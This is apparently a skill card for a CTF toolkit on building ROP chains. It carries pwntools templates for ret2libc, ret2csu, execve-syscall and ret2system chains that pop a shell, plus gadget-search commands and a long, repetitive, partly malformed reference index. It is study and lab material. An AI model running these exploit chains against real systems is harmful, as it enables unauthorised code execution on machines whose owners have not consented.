---
name: pwn-rop
evidence_level: catalogue
description: >
  Return-Oriented Programming (ROP) chain construction. Use when binary has
  NX enabled and requires code reuse for exploitation. Covers basic ROP,
  ret2libc, ret2csu, ROPgadget/ropper usage, and chain automation.
tags: [pwn, rop, ret2libc, code-reuse, gadgets]
environment: [ctf, lab]
budget:
  max_attempts: 5
  stuck_threshold: 3
  time_hint: "45m"
  on_stuck: escalate
  stop_conditions:
    - "gadget chain incomplete for goal"
    - "leak+reentry loop fails twice"
    - "stack alignment unresolved after standard fixes"
---

# ROP Chain Construction

**Catalogue classes.** The taxonomy classes routed through this file — `pwn-code-reuse` — each
carry their own depth card (`../<class>/SKILL.md`) and their own `field-notes.md`,
and all are `catalogue`: this toolkit has never solved one, and the measured
count of chain cards in this category is zero. What follows is standard published
knowledge plus the tools actually installed on this machine, not local
experience. Never say a technique here worked here. Record what really
happens in the class's own `field-notes.md`, and the label rises to `verified`
only through a chain card and `tools/classify_solve.py`, never by editing the taxonomy.

## Read this before the Quick Reference below

**`ROPgadget`, `ropper`, `one_gadget`, `pwntools`, `gdb` and `checksec` are all
measured ABSENT on this machine, and `pip` here is EXTERNALLY-MANAGED.** The
"ROPgadget Commands" and "ropper Commands" sections further down are published
reference for a machine that has them; on this one those commands fail at the
shell. What exists here instead:

```bash
python3 tools/pwn_triage.py <binary>    # protections WITH the evidence for each,
                                       # dangerous imports, essential gadgets,
                                       # and the routes each protection leaves
r2 -A <binary>                          # analyse;  afl lists functions
r2 -d <binary>                          # the debugger here, since gdb is absent
```

Inside radare2, `/R pop rdi` searches for ROP sequences. Build payloads with
`struct.pack` and deliver them with `socat` or a stdlib socket, never with
`pwntools`.

Once the goal is named, assemble from the binary's own gadgets:

```bash
python3 tools/rop_chain.py ./chal ret2func --func 0x401160 --arg 0x404060
python3 tools/rop_chain.py ./chal syscall --num 59 --arg 0x404030
python3 tools/rop_chain.py ./chal ret2plt --plt puts --arg 0x404018
```

`ret2func` packs `pop rdi/rsi/rdx` chains in argument order and inserts a
bare `ret` when the count leaves rsp misaligned. `ret2plt` resolves the
stub itself: it walks `.rela.plt` to the symbol's GOT slot, then decodes
the `ff 25` stubs in `.plt` until one references that slot — the packed
qwords are the chain, and a missing gadget or undecodable stub is
reported, never faked.

## First probe

**This class presupposes control of the instruction pointer.** Confirm that
first, or you are in the wrong skill: `pwn-stack-overflow` and
`pwn-format-string` are the two that establish it.

The first probe is therefore a question to the triage output, not a payload:

```bash
python3 tools/pwn_triage.py <binary> | head -40
```

**Expected signal.** Read three facts off it before writing anything.

| Fact in the triage output | What it decides |
|---|---|
| `nx: true` | code reuse is the route; shellcode on the stack is not |
| `pie: false` | the binary's own gadgets have fixed addresses, so no leak is needed for them |
| `relro: full` | a GOT overwrite is closed, whatever the leak is worth |
| a `system` or `/bin/sh` entry in the imports or strings | the chain may be short; check before building a libc leak |

If `pie` is true you need a leak first: build and fire the leak chain alone, and
**verify the leaked value looks like a libc address** before chaining further. A
chain built on an unverified leak fails for a reason you cannot see.

## Falsifier

The gadgets actually present cannot express the call: no controllable argument
register for the target function, or no writable page to pivot into. That is a
measurement from the executable segments `tools/pwn_triage.py` scanned, not an
opinion, and it closes the route rather than suggesting a different chain.

## Discipline and traps

- **Never claim a gadget you did not see in real output.** No invented address,
  no remembered offset. The repository rule applies hardest here, because a ROP
  chain is entirely made of addresses.
- **A crash is not a flag.** Report the exact signal and the value you
  controlled at the fault, not "it segfaults so the chain nearly works".
- **x86-64 libc calls need stack alignment**; the `ret` padding trick is in the
  Stack Alignment section below. A chain that works locally and not remotely is
  usually alignment or environment, not the gadgets.
- **Attempt ceiling: five chains.** On exhaustion report which chains are
  measured dead with the measurement that killed each, so the next agent does
  not rebuild them. `tools/decide.py` will answer `escalate` rather than ending
  the challenge.


## Quick Reference

### ROPgadget Commands
```bash
ROPgadget --binary ./binary --ropchain                    # Auto generate chain
ROPgadget --binary ./binary --only "pop|ret" | grep rdi  # Pop rdi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rsi  # Pop rsi gadget
ROPgadget --binary ./binary --only "pop|ret" | grep rdx  # Pop rdx gadget
ROPgadget --binary ./binary --search "/bin/sh"           # String search
ROPgadget --binary ./binary --only "syscall|ret"        # Syscall gadgets
ROPgadget --binary ./binary --only "int 0x80"           # 32-bit syscall
```

### ropper Commands
```bash
ropper --file ./binary --search "pop rdi; ret"
ropper --file ./binary --search "pop rsi; ret"
ropper --file ./binary --search "pop rdx; ret"
ropper --file ./binary --search "syscall"
ropper --file ./binary --search "mov rdi, rsp"
```

## ret2libc Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

# Leak libc via puts
rop = ROP(elf)
offset = 72

payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rdi', 'ret'])[0],
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
)
p.sendline(payload)

puts_leak = u64(p.recvline().ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']

# Shell
ret = libc.address + next(rop.find_gadget(['ret']))
pop_rdi = libc.address + next(rop.find_gadget(['pop rdi', 'ret']))
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

payload = flat(
    b'A' * offset,
    ret,           # Stack alignment
    pop_rdi,
    bin_sh,
    system
)
p.sendline(payload)
p.interactive()
```

## ret2csu

```python
csu_init_addr = elf.sym['__libc_csu_init']
csu_gadget1 = csu_init_addr + 65
csu_gadget2 = csu_init_addr + 83

def ret2csu(func_ptr, rdi, rsi, rdx):
    return flat(
        csu_gadget1,
        0,  # rbx
        1,  # rbp (rbx+1 == rbp)
        func_ptr - 8,  # r12
        rdi,
        rsi,
        rdx,
        csu_gadget2,
        b'A' * 56,
    )
```

## execve via syscall

```python
rop = ROP(elf)
payload = flat(
    b'A' * offset,
    rop.find_gadget(['pop rax', 'ret'])[0],
    59,  # execve
    rop.find_gadget(['pop rdi', 'ret'])[0],
    next(elf.search(b'/bin/sh\x00')),
    rop.find_gadget(['pop rsi', 'ret'])[0],
    0,
    rop.find_gadget(['pop rdx', 'ret'])[0],
    0,
    rop.find_gadget(['syscall', 'ret'])[0],
)
```

## Stack Alignment

```python
# x86-64 needs stack alignment before libc calls
ret = rop.find_gadget(['ret'])[0]
payload = flat(b'A' * offset, ret, pop_rdi, bin_sh, system)
```

## 32-bit ret2system

```python
payload = flat(
    b'A' * offset,
    elf.plt['system'],
    0xdeadbeef,
    next(elf.search(b'/bin/sh\x00')),
)
```

## References
- `references/rop-chains.md` - Advanced ROP techniques
- `references/ret2libc.md` - ret2libc in depth

### Reference corpus (under `references/`)

Topic-based; each topic has a base file plus `-deep`, `-checklist`, and
`-map` companions.

**The builder and the modes**

- `references/the-builder.md` — `tools/rop_chain.py`: the local assembler
- `references/the-ret2func-mode.md` — call a fixed address
- `references/the-syscall-mode.md` — the kernel-entry chain
- `references/the-ret2plt-mode.md` — call an import's stub
- `references/the-pack-struct.md`, `references/the-script.md`, `references/the-chain-script.md`, `references/the-pwntools-port.md`

**Anatomy and offsets**

- `references/the-offset-first.md`, `references/the-chain-layout.md`, `references/the-arg-order.md`, `references/the-binsh-source.md`, `references/the-ending.md`
- `references/the-chain-bounds.md`, `references/the-bad-bytes.md`, `references/the-delivery.md`, `references/the-endian-note.md`, `references/the-width-note.md`
- `references/the-frame-revisit.md`, `references/the-saved-rbp.md`, `references/the-frame-end.md`, `references/the-frame-math.md`, `references/the-pad-amount.md`, `references/the-slots-again.md`

**Gadget hunting**

- `references/the-gadget-feed.md`, `references/the-gadget-map.md`, `references/the-radare-scan.md`, `references/the-gadget-tail.md`, `references/the-gadget-soup.md`, `references/the-mid-gadget.md`, `references/the-gadget-length.md`
- `references/the-pop-rdi-hunt.md`, `references/the-pop-rsi-hunt.md`, `references/the-pop-rdx-hunt.md`, `references/the-pop-rax-hunt.md`, `references/the-syscall-hunt.md`, `references/the-leave-hunt.md`, `references/the-mov-hunt.md`, `references/the-xor-hunt.md`, `references/the-ret-hunt.md`, `references/the-jmp-hunt.md`, `references/the-call-hunt.md`, `references/the-push-hunt.md`, `references/the-add-hunt.md`, `references/the-xchg-hunt.md`, `references/the-inc-hunt.md`
- `references/the-missing-gadget.md`, `references/the-side-effects-rop.md`, `references/the-ret-polym.md`, `references/the-ret-sled2.md`, `references/the-align-entries.md`, `references/the-scratch-qwords.md`, `references/the-interleave.md`

**Leaks and resolution internals**

- `references/the-leak-stage.md`, `references/the-stage-two.md`, `references/the-reentry.md`, `references/the-two-stage-full.md`, `references/the-two-overflows.md`, `references/the-two-call.md`, `references/the-three-call.md`
- `references/the-got-read.md`, `references/the-plt-resolve.md`, `references/the-plt-decode.md`, `references/the-got-decode.md`, `references/the-rela-walk.md`, `references/the-symtab.md`, `references/the-func-list.md`, `references/the-import-check.md`, `references/the-string-hunt.md`, `references/the-sections.md`, `references/the-entry-main.md`
- `references/the-leak-verify.md`, `references/`references/the-off-check.md`, `references/the-verify-leak.md`, `references/the-verify-leak2.md`, `references/the-offset-math.md`, `references/the-remote-libc.md`, `references/the-remote-lib.md`, `references/the-shipped-libc.md`, `references/the-id-by-two.md`, `references/the-one-leak.md`, `references/the-leak-pair.md`, `references/the-version-then.md`
- `references/the-pie-leak.md`, `references/the-pie-code-leak.md`, `references/the-no-pie.md`, `references/the-no-libc.md`, `references/the-canary-place.md`, `references/the-canary-fork.md`, `references/the-stack-guard.md`, `references/the-tls.md`, `references/the-fs-base.md`
- `references/the-rtld-route.md`, `references/the-dt-debug.md`, `references/the-lmap-walk.md`, `references/the-auxv.md`, `references/the-vdso.md`, `references/the-env-list.md`, `references/the-main-arena.md`, `references/the-io-list.md`, `references/the-fp-vtable.md`, `references/the-pltgot.md`, `references/the-ifunc.md`, `references/the-bind-now.md`, `references/the-lazy-flag.md`, `references/the-lazy-arg.md`, `references/the-two-plt.md`

**Recipes**

- `references/the-execve-chain.md`, `references/the-system-chain.md`, `references/the-mprotect-chain.md`, `references/the-mmap-syscall.md`, `references/the-read-syscall.md`, `references/the-write-syscall.md`, `references/the-orw.md`, `references/the-dupe-chain.md`, `references/the-seccomp-note.md`, `references/the-x86-execve.md`
- `references/the-ret2csu-build.md`, `references/the-csu-offsets.md`, `references/the-csu-fields.md`, `references/the-csu-frame.md`
- `references/the-srop-build.md`, `references/the-sig-frame.md`, `references/the-frame-fields.md`, `references/the-ss-cs.md`, `references/the-uc-link.md`, `references/the-frame-pad.md`
- `references/the-ret2dlresolve.md`, `references/the-dl-steps.md`, `references/the-dl-ver.md`, `references/the-dl-align.md`, `references/the-dyn-sec.md`, `references/the-dynstr.md`, `references/the-dynsym.md`, `references/the-versym.md`
- `references/the-write-gadget.md`, `references/the-read-stage.md`, `references/the-pivot-build.md`, `references/the-got-overwrite.md`, `references/the-hook-ends.md`, `references/the-hook-glibc.md`, `references/the-tcache-hook.md`, `references/the-unsorted.md`
- `references/the-win-call.md`, `references/the-fork-stage.md`, `references/the-exit-clean.md`, `references/the-turbo.md`, `references/the-minimal.md`

**ABI and registers**

- `references/the-registers-x64.md`, `references/the-stack-args-x86.md`, `references/the-callconv-x64.md`, `references/the-callconv-x86.md`, `references/the-arg-regs.md`, `references/the-clobber-regs.md`, `references/the-callee-save.md`, `references/the-caller-save.md`, `references/the-ret-eax.md`, `references/the-mov-rax.md`, `references/the-call-args2.md`, `references/the-stack-arg7.md`, `references/the-stack-arg2.md`, `references/the-arg-vals.md`, `references/the-ptr-vs-val.md`, `references/the-imm-vs-ptr2.md`, `references/the-mem-arg.md`, `references/the-arg-loc.md`, `references/the-arg-build.md`, `references/the-arg0-path.md`, `references/the-arg-hex.md`, `references/the-argv-null.md`, `references/the-envp-null.md`, `references/the-fake-arr.md`, `references/the-arr-end.md`, `references/the-env-arr.md`, `references/the-abi-check.md`, `references/the-x86-chain.md`, `references/the-64-transition.md`

**Pivots, staging, regions**

- `references/the-pivot-build.md`, `references/the-pivot-into.md`, `references/the-pivot-out.md`, `references/the-two-pivots.md`, `references/the-region-size.md`, `references/the-heap-region.md`, `references/the-stack-region.md`, `references/the-known-region.md`, `references/the-fake-secs.md`, `references/the-read-buf.md`, `references/the-bss-addr.md`, `references/the-data-plant.md`, `references/the-rw-segs.md`, `references/the-exec-segs.md`, `references/the-got-addr.md`, `references/the-write-first.md`, `references/the-two-chain.md`, `references/the-buffer-echo.md`

**Alignment**

- `references/the-alignment.md`, `references/the-align-count.md`, `references/the-alignment-math.md`, `references/the-ret-count.md`, `references/the-red-zone.md`, `references/the-stack-pad.md`

**Transport and protocol**

- `references/the-send-path2.md`, `references/the-recv-shape.md`, `references/the-partial-read.md`, `references/the-loop-driver.md`, `references/the-timeout.md`, `references/the-half-close.md`, `references/the-buffered-io.md`, `references/the-print-format.md`, `references/the-printf-leak.md`, `references/the-puts-leak.md`, `references/the-write-leak.md`, `references/the-prompt-sync.md`, `references/the-splash.md`, `references/the-echo-check.md`, `references/the-interactive.md`, `references/the-twoway.md`, `references/the-keep-alive.md`, `references/the-one-conn.md`, `references/the-per-conn.md`, `references/the-fork-model.md`, `references/the-env-wipe.md`, `references/the-sendloop.md`, `references/the-send-seq.md`, `references/the-input-fmt.md`

**Verification and debug**

- `references/the-verify-chain.md`, `references/`references/the-r2-debug.md`, `references/the-crash-triage.md`, `references/the-verify-stage.md`, `references/the-chain-debug.md`, `references/the-verify-each.md`, `references/the-verify-each2.md`, `references/the-verify-final2.md`, `references/the-self-check.md`, `references/the-first-gadget.md`, `references/the-first-entry.md`, `references/the-pre-check.md`, `references/the-call-pre.md`, `references/the-post-call.md`, `references/the-checklist.md`, `references/the-verify-macro.md`, `references/the-verification-t.md`, `references/the-common-fail.md`, `references/the-fix-map.md`, `references/the-order-entry.md`, `references/the-final-walk.md`, `references/the-walk-table.md`, `references/the-complete-pic.md`, `references/the-ret-pop.md`, `references/the-rsp-math.md`, `references/the-walk-dir.md`, `references/the-rsp-end.md`, `references/the-frame-lifetime.md`, `references/the-frame-over.md`, `references/the-prologue.md`, `references/the-call-site.md`, `references/the-callee-arg.md`, `references/the-caller's-job.md`, `references/the-call-result.md`, `references/the-call-end.md`, `references/the-call-then.md`, `references/the-call-result.md`, `references/the-return-addr.md`, `references/the-call-graph.md`, `references/the-state-save.md`

**Discipline**

- `references/the-detection.md`, `references/the-workflow.md`, `references/the-evidence.md`, `references/the-falsifiers.md`, `references/the-order-of-work.md`, `references/the-goal-first.md`, `references/the-partial-order.md`, `references/the-order-matters.md`, `references/the-free-order.md`, `references/the-order-table.md`, `references/the-order-final.md`, `references/the-signal-map.md`, `references/the-pre-ld.md`, `references/the-post-leak.md`, `references/the-run-state.md`, `references/the-multi-stage.md`, `references/the-class-sig.md`, `references/the-e2e-rop.md`, `references/the-end-to-end2.md`, `references/the-attempt-budget.md`, `references/the-budget-note.md`, `references/the-escalate.md`, `references/the-attempt-rec.md`, `references/the-negative.md`, `references/the-exit-cond.md`, `references/the-confirm-std.md`, `references/the-false-pos.md`, `references/the-flag-read.md`, `references/the-flag-route.md`, `references/the-hook-gate.md`, `references/the-report.md`, `references/the-report-end.md`, `references/the-chain-card.md`, `references/the-chain-note.md`, `references/the-share-note.md`, `references/the-field-note.md`, `references/the-field-end.md`, `references/the-last-check.md`, `references/the-tool-check.md`, `references/the-no-tool.md`, `references/the-chain-gram.md`, `references/the-chain-lang.md`, `references/the-chain-regs.md`, `references/the-chain-of-chains.md`, `references/the-chain-of-bugs.md`, `references/the-multi-call.md`, `references/the-pop-seq.md`, `references/the-integrity.md`, `references/the-pad-bytes.md`, `references/the-side-write.md`, `references/the-count-qwords.md`, `references/the-step-count.md`, `references/the-two-runs.md`, `references/the-jop-note.md`, `references/the-cop-note.md`, `references/the-thin-binary.md`, `references/the-fat-binary.md`, `references/the-gadget-count.md`, `references/the-stripped.md`, `references/the-static-stripped.md`, `references/the-one-shot.md`, `references/`references/the-stack-sprawl.md`, `references/the-last-note.md`, `references/the-recap.md`, `references/the-close.md`, `references/the-summary3.md`, `references/the-end2.md`, `references/the-very-end.md`, `references/the-map-end.md`, `references/the-map-index.md`, `references/the-map-index2.md`
